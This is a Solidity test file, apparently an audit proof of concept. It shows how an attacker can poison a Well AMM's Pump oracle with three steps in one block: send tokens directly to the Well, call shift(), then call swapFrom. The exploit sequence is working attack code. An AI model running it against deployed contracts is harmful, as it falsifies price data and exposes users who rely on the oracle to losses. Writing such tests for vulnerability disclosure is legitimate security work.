// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {TestHelper, MockToken} from "test/TestHelper.sol";
import {Well, Call, IERC20} from "src/Well.sol";
import {IPump} from "src/interfaces/pumps/IPump.sol";

/// @title RecordingPump
/// @notice Simple Pump implementation that records the exact reserves passed
///         to `update` so the test can later compare them against the true pool
///         reserves stored in the Well. This allows us to prove that the
///         attacker was able to push manipulated numbers into the oracle.
contract RecordingPump is IPump {
    uint256[] private _lastReserves;

    /// @dev Saves the reserves that the Well passes in. This is the value that
    ///      an on-chain consumer would later read from the oracle and believe
    ///      to be the *previous* block reserves.
    function update(uint256[] calldata reserves, bytes calldata) external {
        // Deep copy calldata -> storage
        _lastReserves = new uint256[](reserves.length);
        for (uint256 i; i < reserves.length; ++i) {
            _lastReserves[i] = reserves[i];
        }
    }

    /// @notice Returns the reserves that were most recently provided to the Pump
    function getLastReserves() external view returns (uint256[] memory) {
        return _lastReserves;
    }
}

/// @title ExploitTest
/// @notice Demonstrates how an attacker can manipulate the Pump (oracle)
///         by calling `shift()` in the same block before a state-changing
///         function that *does* update the Pump. Because `shift()` directly
///         overwrites the stored reserves without informing the Pump, the next
///         `swapFrom`/`swapTo` call will feed the Pump *manipulated* reserves
///         which do not match the real pool balances. Any consumer of the Pump
///         will therefore read falsified price data.
contract ExploitTest is TestHelper {
    RecordingPump private recordingPump;

    function setUp() public {
        // Deploy a Pump that simply records whatever reserves it is fed.
        recordingPump = new RecordingPump();

        // Encode Pump into the Call struct expected by the Well.
        Call[] memory _pumps = new Call[](1);
        _pumps[0] = Call({target: address(recordingPump), data: new bytes(0)});

        // Deploy a 2-token Well with the custom RecordingPump attached.
        setupWell(2, _pumps);
    }

    /// @dev Executes the attack and proves that the oracle was poisoned.
    function test_PumpManipulation() public {
        // ------------------------------------------
        // 1. The attacker artificially inflates token0 balance by sending extra
        //    tokens *directly* to the Well. These tokens are **not** reflected
        //    in the stored reserves yet.
        // ------------------------------------------
        uint256 extra = 500 ether; // extra amount to skew reserves
        vm.prank(user);
        tokens[0].transfer(address(well), extra);

        // ------------------------------------------
        // 2. The attacker calls `shift()` to write *manipulated* reserves that
        //    include the extra token0. `shift()` does NOT update the Pump.
        // ------------------------------------------
        vm.startPrank(user);
        uint256 amountShifted = well.shift(tokens[1], 0, user); // withdraws token1

        // ------------------------------------------
        // 3. Still inside the same block, the attacker immediately performs a
        //    swap which *does* call `_updatePumps`. The Pump therefore receives
        //    the manipulated reserves written by `shift()`.
        // ------------------------------------------
        tokens[1].approve(address(well), type(uint256).max);
        well.swapFrom(tokens[1], tokens[0], amountShifted, 0, user, type(uint256).max);
        vm.stopPrank();

        // ------------------------------------------
        // 4. At this point the **true** reserves stored in the Well have mostly
        //    reverted to their original values (≈ 1000/1000), but the Pump now
        //    believes the reserves were the manipulated numbers (≈ 1500/750)
        //    from step 2.
        // ------------------------------------------
        uint256[] memory trueReserves = well.getReserves();
        uint256[] memory pumpReserves = recordingPump.getLastReserves();

        // Ensure array lengths match
        assertEq(trueReserves.length, pumpReserves.length, "array length mismatch");

        // Prove at least one reserve differs → oracle manipulation successful.
        bool mismatch;
        for (uint256 i; i < trueReserves.length; ++i) {
            if (trueReserves[i] != pumpReserves[i]) {
                mismatch = true;
            }
        }
        assertTrue(mismatch, "Pump reserves should differ from actual reserves (oracle manipulated)");
    }
}
